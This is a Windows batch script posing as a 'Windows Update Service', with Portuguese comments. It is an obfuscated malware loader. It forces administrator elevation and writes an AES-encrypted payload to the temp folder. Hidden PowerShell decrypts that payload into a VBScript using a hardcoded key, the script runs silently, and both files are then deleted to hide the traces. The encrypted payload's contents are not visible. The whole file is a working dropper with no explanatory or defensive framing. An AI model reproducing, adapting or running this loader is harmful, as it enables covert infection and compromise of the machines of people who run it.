@echo off
setlocal EnableDelayedExpansion
title Windows Update Service

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo [*] Inicializando componentes...

set "1fPF3a=%TEMP%\JedvM.txt"
set "AiOPfw=%TEMP%\xDs70.vbs"

:: Salva os dados criptografados em um arquivo de texto
echo T9yuL/xtBvh9zBSqf6x5k1qwXi/QXA9jmlLp+jPUeQBG5+TktOHdWMNJo00dFQLV2S5OR9c8dMFW7gfyrVxQQkWxUaA4dOenfNBvlAsKCQfFF6gGpdbpV/epFusmkUcUViFD+3CM01ducdJlVK+5laYIL+PTRlh3RjvJ0EPmHgus6cHoONNCGjlR0U3rptR0kCOYHHnV69c+KB7oRmyFgKpO/kykR+yAAQB0H6IpSfw/65bs28Vmm4Sr5vmubsy/flKz74J2jjk119t+65TH0Td57iXdnzv/zROsPInXUvSu+ZPiD7bKEiJ+hz25Xmm1+9Q5prEI0k85VL1ji435fRvTwQA9lQ3a/fdUJTbvJR4hkd+Twea4D6X3UawrU709+TcOdWBJiBsRVvwHPL8ncvA49gmH59CqoVksxTKvphbUM+3EEl/Bqtw6w6NqdKgh8og7+MRXnMlenm3a3bED22MFXiJu5F3O8zM0n4LK8PVwjgMsjD14tUoIxGztWVUosTCKSTnO2gvC1X6OooT5ebdhYNnKEi5uqB3bsS4KkMAA90YfX9IfkfWH19m8YdigoIhMsmZwX8XCDl3THCe5YvU52gSLm2wr0kiv3urge8t6xqDE1KYPMDQwwJTTKtSZHae0QCtSdEwSll15hUZ42ugYve2apPK3F5ZKJ+HOYl3BieOx/UhjPImvfcQggy3nkULE1xD7nqVMa76HyHgxEwVtRjjBleSWIYsNjUAYjdqh94hr5Ms7pwiFMqNwWHDqvXcMnChRWNG2o5J2qAYiIQN3Ar2bwb/Swl882OG+2/cEKJV28VayPmLoqSHRmLPWv4xAj0HeLl2e/zfcHeqCVN/3eFt46lSv/xp9wCiWAJ1wItmYAionPprIubbtoSmUJmwVyDd0ALPjDsHflXHKxg== > "%1fPF3a%"

:: O PowerShell apenas descriptografa o VBS e salva no disco
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "$k=[Convert]::FromBase64String('jZ4LY7KbZ+AzbN/tGus2lGaoV9prvGHqm97XsWtyB5M=');" ^
    "$iv=[Convert]::FromBase64String('Inrd1Az7HkXKPhnMC/2Dnw==');" ^
    "$d=[Convert]::FromBase64String((Get-Content -Raw -Path '%1fPF3a%'));" ^
    "$aes=[System.Security.Cryptography.Aes]::Create();" ^
    "$aes.Key=$k; $aes.IV=$iv;" ^
    "$dec=$aes.CreateDecryptor();" ^
    "$ms=New-Object System.IO.MemoryStream(,$d);" ^
    "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read);" ^
    "$sr=New-Object System.IO.StreamReader($cs);" ^
    "[System.IO.File]::WriteAllText('%AiOPfw%', $sr.ReadToEnd());" ^
    "$cs.Close(); $ms.Close()"

:: Roda o VBScript silenciosamente
cscript //nologo //B "%AiOPfw%"

:: Limpeza
ping -n 3 127.0.0.1 >nul
del /f /q "%1fPF3a%" >nul 2>&1
del /f /q "%AiOPfw%" >nul 2>&1
exit
